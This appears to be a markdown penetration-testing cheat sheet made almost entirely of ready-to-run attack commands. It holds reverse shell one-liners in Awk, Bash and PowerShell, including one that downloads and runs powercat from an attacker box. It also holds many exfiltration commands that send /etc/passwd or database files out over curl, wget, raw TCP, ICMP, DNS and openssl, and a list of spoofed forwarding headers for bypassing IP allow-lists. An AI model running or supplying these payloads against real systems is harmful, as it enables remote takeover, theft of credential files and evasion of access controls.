* [Reverse Shell](#reverse-shell)
	* [Awk](#awk)
	* [Bash TCP](#bash-tcp)
	* [Bash UDP](#bash-udp)
	* [PowerShell](#powershell)
* [Spawn TTY Shell](#spawn-tty-shell)
	* [Python](#python)
	* [Perl](#perl)
* [Extension Linux](#extension-linux)
* [Exfiltration - Linux](#exfiltration-linux)
* [IP address bypass](#ip-address-bypass)
* [References](#references)

## Reverse Shell
### Awk
```awk
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Bash TCP
```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```

### Bash UDP
```bash
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

### Powershell
```powershell
Victim:
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"

Attacker:
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8080
nc -lvp 1337
```

## Spawn TTY Shell
### Python
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Python extended
```python
(victim) python3 -c "import pty; pty.spawn('/bin/bash')"
(hacker) Ctrl+Z
(hacker) Enter
(hacker) stty raw -echo
(hacker) fg (you will not see your keystrokes -- trust yourself and hit Enter)
(hacker) Enter
(hacker) Enter
(hacker) export TERM=xterm
```

### Perl
```perl
perl -e 'exec "/bin/bash";'
```
## Exfiltration - Linux
```bash
VICTIM:
cat /etc/passwd | curl -F "data=@-" http://xxx.xxx.xxx.xxx 

ATTACKER:
nc -lvp 80
```
```bash
VICTIM:
cat /etc/passwd | base64 > /dev/tcp/xxx.xxx.xxx.xxx/80

ATTACKER:
netcat -lvp 80 | base64 -d
```
```bash
VICTIM:
cat /etc/passwd | base 64 > /dev/tcp/xxx.xxx.xxx.xxx/443 

ATTACKER:
netcat -lvp 443 | base64 -d
```
```bash
VICTIM:
wget --post-file=/etc/passwd xxx.xxx.xxx.xxx 

ATTACKER:
nc -lvp 80
```
```bash
VICTIM:
curl -X POST -d @data.txt xxx.xxx.xxx.xxx

ATTACKER:
nc -lvp 80
```
```bash
VICTIM:
whois -h xxx.xxx.xxx.xxx -p 43 `cat /etc/passwd`

ATTACKER:
nc -lvp 43
```
```bash
VICTIM:
bash -c 'echo -e "POST / HTTP/0.9\n\n$(</etc/passwd)"' > /dev/tcp/xxx.xxx.xxx.xxx/1234

ATTACKER:
nc -lvp 1234
```
```bash
VICTIM:
openssl s_client -quiet -connect xxx.xxx.xxx.xxx:1234 < "/etc/passwd"

ATTACKER:
openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes ; openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port 1234 > /tmp/dump ; cat /tmp/dump
```
```bash
VICTIM:
cat /etc/passwd | xxd -p -c 15 | while read line; do ping -p $line -c 1 xxx.xxx.xxx.xxx; done

ATTACKER:
/usr/sbin/tcpdump 'icmp and src host 1.2.3.4' -w /tmp/icmp_file.pcap ; echo "0x$(tshark -n -q -r /tmp/icmp_file.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')" | xxd -r -p
```
```bash
VICTIM:
cat /etc/passwd | xxd -p -c 8 | while read line; do host $line.7.7.7.7 xxx.xxx.xxx.xxx ; done

ATTACKER:
/usr/sbin/tcpdump -l -n port 53 | grep -oP "(?=\? ).*(?<=7.7.7.7)"
```
```bash
VICTIM:
tar zcf - --absolute-names /etc/passwd | ssh -p2233 user@xxx.xxx.xxx.xxx "cd /tmp/; tar zxpf -"

```
```bash
VICTIM:
python -m SimpleHTTPServer 7777

ATTACKER:
wget xxx.xxx.xxx.xxx:7777/database.sql
```
```bash
VICTIM:
php -S 0.0.0.0:7777

ATTACKER:
wget xxx.xxx.xxx.xxx:7777/database.sql
```
```bash
VICTIM:
telnet xxx.xxx.xxx.xxx 5555 < /etc/passwd

ATTACKER:
netcat -lp 5555
```

## IP address bypass
```
CACHE_INFO: 127.0.0.1
CF_CONNECTING_IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
CLIENT_IP: 127.0.0.1
Client-IP: 127.0.0.1
COMING_FROM: 127.0.0.1
CONNECT_VIA_IP: 127.0.0.1
FORWARD_FOR: 127.0.0.1
FORWARD-FOR: 127.0.0.1
FORWARDED_FOR_IP: 127.0.0.1
FORWARDED_FOR: 127.0.0.1
FORWARDED-FOR-IP: 127.0.0.1
FORWARDED-FOR: 127.0.0.1
FORWARDED: 127.0.0.1
HTTP-CLIENT-IP: 127.0.0.1
HTTP-FORWARDED-FOR-IP: 127.0.0.1
HTTP-PC-REMOTE-ADDR: 127.0.0.1
HTTP-PROXY-CONNECTION: 127.0.0.1
HTTP-VIA: 127.0.0.1
HTTP-X-FORWARDED-FOR-IP: 127.0.0.1
HTTP-X-IMFORWARDS: 127.0.0.1
HTTP-XROXY-CONNECTION: 127.0.0.1
PC_REMOTE_ADDR: 127.0.0.1
PRAGMA: 127.0.0.1
PROXY_AUTHORIZATION: 127.0.0.1
PROXY_CONNECTION: 127.0.0.1
Proxy-Client-IP: 127.0.0.1
PROXY: 127.0.0.1
REMOTE_ADDR: 127.0.0.1
Source-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Via: 127.0.0.1
VIA: 127.0.0.1
WL-Proxy-Client-IP: 127.0.0.1
X_CLUSTER_CLIENT_IP: 127.0.0.1
X_COMING_FROM: 127.0.0.1
X_DELEGATE_REMOTE_HOST: 127.0.0.1
X_FORWARDED_FOR_IP: 127.0.0.1
X_FORWARDED_FOR: 127.0.0.1
X_FORWARDED: 127.0.0.1
X_IMFORWARDS: 127.0.0.1
X_LOCKING: 127.0.0.1
X_LOOKING: 127.0.0.1
X_REAL_IP: 127.0.0.1
X-Backend-Host: 127.0.0.1
X-BlueCoat-Via: 127.0.0.1
X-Cache-Info: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1, 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-From-IP: 127.0.0.1
X-From: 127.0.0.1
X-Gateway-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Ip: 127.0.0.1
X-Original-Host: 127.0.0.1
X-Original-IP: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originally-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-ProxyMesh-IP: 127.0.0.1
X-ProxyUser-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-True-Client-IP: 127.0.0.1
XONNECTION: 127.0.0.1
XPROXY: 127.0.0.1
XROXY_CONNECTION: 127.0.0.1
Z-Forwarded-For: 127.0.0.1
ZCACHE_CONTROL: 127.0.0.1
```
